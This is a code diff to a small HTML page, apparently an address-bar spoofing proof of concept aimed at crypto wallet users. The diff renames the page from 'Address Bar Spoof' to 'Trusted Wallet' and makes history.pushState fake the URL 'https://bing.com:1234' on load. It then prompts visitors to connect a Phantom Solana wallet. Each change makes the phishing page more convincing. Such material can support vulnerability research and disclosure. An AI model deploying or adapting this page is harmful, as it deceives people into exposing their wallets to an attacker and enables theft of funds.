@@ -3,12 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Address Bar Spoof</title>
+    <title>Trusted Wallet</title>
     <script>
-        // Spoof the URL
-        history.pushState({}, "", "https://bing.com:1234");
-        
-        // Attempt wallet communication
+        // Attempt to spoof the URL
+        window.onload = () => {
+            history.pushState({}, "", "https://bing.com:1234");
+        };
+
+        // Function to mimic wallet connection
         async function attemptWalletConnection() {
             try {
                 if (window.phantom && window.phantom.solana) {
@@ -25,7 +27,7 @@
 </head>
 <body>
     <h1>Welcome to Trusted Wallet</h1>
-    <p>Click the button below to connect your wallet:</p>
+    <p>Please connect your wallet below:</p>
     <button onclick="attemptWalletConnection()">Connect Wallet</button>
 </body>
 </html>
